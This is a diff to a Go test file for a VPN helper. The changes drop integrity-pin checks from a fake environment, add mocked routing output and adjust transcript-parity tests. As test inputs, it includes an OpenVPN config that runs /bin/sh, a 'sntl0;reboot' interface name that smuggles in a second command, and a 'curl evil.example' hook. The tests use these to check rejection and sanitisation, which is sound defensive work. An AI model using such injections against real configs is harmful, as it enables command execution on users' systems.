@@ -43,46 +43,32 @@ type fakeEnv struct {
 	rules  map[string]int
 	ovpnOK bool
 	nextPid int
-	pinOK  map[string]bool // basename -> VerifyPin passes
+	// resolvconfStdin is the last payload handed to `resolvconf -a` (RunOpt.Stdin).
+	resolvconfStdin string
 }
 
 func newFake(t *testing.T) *fakeEnv {
 	t.Helper()
 	root := t.TempDir()
-	f := &fakeEnv{t: t, root: root, rules: map[string]int{}, ovpnOK: true, nextPid: 31337, pinOK: map[string]bool{}}
+	f := &fakeEnv{t: t, root: root, rules: map[string]int{}, ovpnOK: true, nextPid: 31337}
 	f.Env = &Env{
 		Run:      f.run,
 		Spawn:    f.spawn,
 		Kill:     f.kill,
 		Sleep:    func(time.Duration) {},
 		Root:     root,
-		BinDir:   filepath.Join(root, "shim", "awgbin"),
 		LookPath: func(name string) (string, error) { return name, nil },
-		VerifyPin: func(path, name string) error {
-			// /proc/<pid>/exe is a symlink to the binary: judge the target, as the
-			// real VerifyPin hashes the target's bytes.
-			if real, err := filepath.EvalSymlinks(path); err == nil {
-				path = real
-			}
-			if f.pinOK[filepath.Base(path)] && filepath.Base(path) == name {
-				return nil
-			}
-			return fmt.Errorf("%s failed SHA-256 integrity check", name)
-		},
 		Executable: func() (string, error) { return filepath.Join(root, "usr/local/bin/katacomb-vpn-helper"), nil },
 		Warn:       func(m string) { f.warns = append(f.warns, m) },
 	}
-	for _, d := range []string{"sys/class/net", "shim/bin", "shim/awgbin", "usr/sbin", "usr/local/bin", "proc", "etc"} {
+	for _, d := range []string{"sys/class/net", "shim/bin", "usr/sbin", "usr/local/bin", "proc", "etc"} {
 		if err := os.MkdirAll(filepath.Join(root, d), 0o755); err != nil {
 			t.Fatal(err)
 		}
 	}
-	for _, b := range []string{"usr/local/bin/katacomb-vpn-helper", "shim/awgbin/awg", "shim/awgbin/awg-quick", "shim/awgbin/amneziawg-go", "usr/sbin/openvpn"} {
+	for _, b := range []string{"usr/local/bin/katacomb-vpn-helper", "usr/sbin/openvpn"} {
 		if err := os.WriteFile(filepath.Join(root, b), []byte("#!/bin/sh\n"), 0o755); err != nil {
 			t.Fatal(err)
-		}
-		if filepath.Base(b) != "openvpn" { // distro binary, never pinned
-			f.pinOK[filepath.Base(b)] = true
 		}
 	}
 	return f
@@ -107,8 +93,11 @@ func (f *fakeEnv) leakRules() {
 	}
 }
 
-func (f *fakeEnv) run(_ context.Context, argv []string, _ RunOpt) ([]byte, []byte, error) {
+func (f *fakeEnv) run(_ context.Context, argv []string, opt RunOpt) ([]byte, []byte, error) {
 	f.cmds = append(f.cmds, append([]string(nil), argv...))
+	if filepath.Base(argv[0]) == "resolvconf" {
+		f.resolvconfStdin = string(opt.Stdin)
+	}
 	fail := func(msg string, code int) ([]byte, []byte, error) {
 		return nil, []byte(msg), &ExitError{Argv: argv, Code: code, Stderr: msg}
 	}
@@ -144,6 +133,12 @@ func (f *fakeEnv) run(_ context.Context, argv []string, _ RunOpt) ([]byte, []byt
 				sb.WriteString("32765:\tfrom all lookup main suppress_prefixlength 0\n")
 			}
 			return []byte(sb.String()), nil, nil
+		case len(a) == 3 && a[0] == "route" && a[1] == "get":
+			return []byte(a[2] + " via 192.168.1.1 dev eth0 src 192.168.1.10 uid 0 \n"), nil, nil
+		case len(a) >= 2 && a[0] == "route" && a[1] == "show":
+			return []byte("default via 192.168.1.1 dev eth0 proto dhcp metric 100 \n"), nil, nil
+		case len(a) == 4 && a[0] == "link" && a[1] == "show" && a[2] == "dev":
+			return []byte("2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP\n"), nil, nil
 		case len(a) >= 2 && a[0] == "rule" && a[1] == "delete":
 			k := fam + ".fw"
 			if strings.Contains(strings.Join(a, " "), "suppress_prefixlength 0") {
@@ -213,6 +208,9 @@ func (f *fakeEnv) spawn(argv []string, _ RunOpt) (int, error) {
 	if len(argv) > 1 && argv[1] == "_tun2socks" {
 		f.addLink("sntl-tun")
 	}
+	if len(argv) > 1 && argv[1] == "_amneziawg" {
+		f.addLink("sntl0")
+	}
 	return f.nextPid, nil
 }
 
@@ -256,7 +254,10 @@ func normalise(argv []string, root string) []string {
 		if len(a) > 0 && (a[0] == "-4" || a[0] == "-6") {
 			a = a[1:]
 		}
-		if len(a) == 3 && a[0] == "link" && a[1] == "show" {
+		if len(a) >= 2 && a[0] == "link" && a[1] == "show" {
+			return nil
+		}
+		if len(a) >= 2 && a[0] == "route" && (a[1] == "get" || a[1] == "show") {
 			return nil
 		}
 		if len(a) == 5 && a[0] == "-o" && a[1] == "link" && a[2] == "show" {
@@ -507,7 +508,6 @@ func TestTranscriptParity(t *testing.T) {
 		}
 	}
 
-	awgBin := f.BinDir
 	self, _ := f.Executable()
 	tunUp := func(bypass ...string) func() error {
 		return func() error {
@@ -538,8 +538,9 @@ func TestTranscriptParity(t *testing.T) {
 			t.Errorf("cleanup_wg_rules left %s = %d", k, v)
 		}
 	}
-	step("11-awg-up", func() error { return AmneziaWgUp(ctx, f.Env, cfgAWG, awgBin) })
-	step("12-awg-down", func() error { return AmneziaWgDown(ctx, f.Env) })
+	// awg-up / awg-down: not replayed against the bash helper. Since Phase 3 the
+	// device is embedded and the verb is a behavioural reimplementation of
+	// wg-quick(8); its command sequence is asserted in amneziawg_ops_test.go.
 	step("13-ovpn-up", func() error { return OpenVpnUp(ctx, f.Env, cfgOVPN) })
 	step("14-ovpn-down", func() error { return OpenVpnDown(ctx, f.Env) })
 	if !strings.Contains(strings.Join(f.takeKills(), ","), "4242:15") {
@@ -604,10 +605,8 @@ func TestTranscriptParity(t *testing.T) {
 	step("32-killswitch-on-zero", ks(KillswitchParams{Iface: "sntl0", RemoteHost: "0.0.0.0"}))
 	// 33-tun-up-missing-bin is not replayed: the bash helper refused a missing
 	// tun2socks path, and the engine is embedded now (the slot is ignored).
-	if err := os.MkdirAll(filepath.Join(f.root, "tmp/emptybin"), 0o755); err != nil {
-		t.Fatal(err)
-	}
-	step("35-awg-up-missing-bin", func() error { return AmneziaWgUp(ctx, f.Env, cfgAWG, filepath.Join(f.root, "tmp/emptybin")) })
+	// 35-awg-up-missing-bin is gone with the trio: `<bindir>` is accepted and
+	// ignored now (amneziawg_ops_test.go asserts that), so there is nothing to refuse.
 	ovpnUp := []byte(strings.Replace(string(cfgOVPN), "nobind", "up /bin/sh", 1))
 	step("36-ovpn-up-script", func() error { return OpenVpnUp(ctx, f.Env, ovpnUp) })
 	step("37-killswitch-on-badiface", ks(KillswitchParams{Iface: "sntl0;reboot", RemoteHost: "203.0.113.7"}))
@@ -720,7 +719,7 @@ func TestErrorsNeverEchoConfig(t *testing.T) {
 	if err == nil || strings.Contains(err.Error(), "evil.example") {
 		t.Fatalf("got %v", err)
 	}
-	if err := AmneziaWgUp(context.Background(), f.Env, secret, f.BinDir); err == nil || strings.Contains(err.Error(), "evil.example") {
+	if err := AmneziaWgUp(context.Background(), f.Env, secret, "-"); err == nil || strings.Contains(err.Error(), "evil.example") {
 		t.Fatalf("got %v", err)
 	}
 	if err := OpenVpnUp(context.Background(), f.Env, []byte("client\nup /bin/sh -c 'curl evil.example'\n")); err == nil || strings.Contains(err.Error(), "evil.example") {
